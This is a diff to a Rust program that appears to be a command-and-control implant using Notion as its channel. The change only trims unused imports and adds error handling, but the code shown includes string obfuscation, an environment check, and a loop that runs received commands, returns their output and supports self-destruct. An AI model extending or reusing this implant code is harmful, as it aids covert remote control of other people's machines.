@@ -14,15 +14,12 @@ use std::process::exit;
 use std::process::Command;
 use rand::prelude::*;
 
-use whoami::hostname;
-use reqwest::Client;
-use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
 use base64::decode;
 use litcrypt::{lc, use_litcrypt};
 
 mod config;
 pub mod channels;
-use channels::{Channel, ChannelType, notion::{NotionChannel, NotionConfig}};
+use channels::{Channel, ChannelType};
 use config::{
     ConfigOptions,
     get_config_options, 
@@ -36,7 +33,6 @@ mod logger;
 use logger::Logger;
 use logger::log_out;
 mod env_check;
-use serde_json::to_string;
 
 use_litcrypt!();
 
@@ -179,7 +175,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         for mut c in commands {
             let output: String = c.handle(&mut config_options, &logger).await?;
             channel.complete(c.clone()).await;
-            channel.send(output, &c.rel).await;
+            channel.send(output, &c.rel).await.unwrap();
             match c.command_type {
                 CommandType::Shutdown => {exit(0);},
                 CommandType::Selfdestruct => {exit(0)},
